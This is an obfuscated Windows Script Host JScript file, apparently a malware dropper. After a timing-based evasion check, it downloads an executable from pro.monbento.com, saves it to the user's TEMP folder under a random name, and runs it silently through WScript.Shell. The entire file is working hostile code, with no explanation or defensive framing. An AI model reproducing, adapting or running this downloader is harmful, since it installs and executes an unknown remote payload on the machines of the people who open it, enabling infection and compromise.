var _L = false;
var _N = "CreateObject";
var _AQ = function _VI() {return WScript[_N]("WScript"+".Shell");}(), _TX = 11;
var _UG = "MSXML2.XMLHTTP";
var _U2 = 2123213;
var _O = 0;
function _GB(_M){_AQ["Run"](_M, _O, _O);};
function _S(){return _UG + "";};
function _VE(_Y0, _V){_O = _O * 1; return _Y0 - _V;};
function _TQ(){return _N;};
/*@cc_on
  @if (@_win32 || @_win64)
    _L = true;
  @end
@*/
if (_L)
{
var _LM = "";
function _WR(){return 22;};
var _E0 = 0; var _I = 0;
function _P()
{
var _E = new this["Date"]();
var _DE = _E["getUTCMilliseconds"]();
WScript["Sleep"](_WR());
var _E = new this["Date"]();
var _U1 = _E["getUTCMilliseconds"]();
WScript["Sleep"](_WR());
var _E = new this["Date"]();
var _D = _E["getUTCMilliseconds"]();
var _E0 = "_SY";
_E0 = _VE(_U1, _DE);
var _I = "_B";
_I = _VE(_D, _U1);
_LM = "open";
return _VE(_E0, _I);
}
var _XZ = false;
var _FV = false;
for (var _U = _O; _U < _WR() * 1; _U++){if (_P() != _O){
_XZ = true; 
_I = "31" + 11 * _E0 + _I; 
_FV = true; 
break;
}}
function _LY() {return ((_XZ == true) && (_XZ == _FV)) ? 1 : _O;};
if (_XZ && _LY() && _FV){
function _TA() {return _AQ["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "Sm8Pv4gZTzTKXY.ex" + "e";};
 _A = _S();
 _I0 = WScript[_N](_A);
 var _T = 1;
 while (_T){
try {
	if (_T == 1)
	{
		_I0[_LM]("GET", "http://pro.monbento.com/n3iska", false);
		_I0["send"]();
		_P0 = "Sleep";
	}
	WScript[_P0](_WR() + 120); 
	if (_I0["readystate"] < 2 * 2) continue;
	_T = _O;
	function _PU(_O0) {var _U0 = (1, 2, 3, 4, 5, _O0); return _U0;};
	_C = WScript[_TQ()]("ADODB.Stream");
	_A = _C;
	_A[_LM]();
	_A["type"] = _PU(1);
	_A["write"](_I0["ResponseBody"]);
	_C["position"] = _PU(_O);
	_A["Save" + "ToFile"](_TA(), 2);
	_C["cl"+"ose"]();
	_Y = _TA();
	_GB(_Y);
} catch(_RW){};
}
}
}

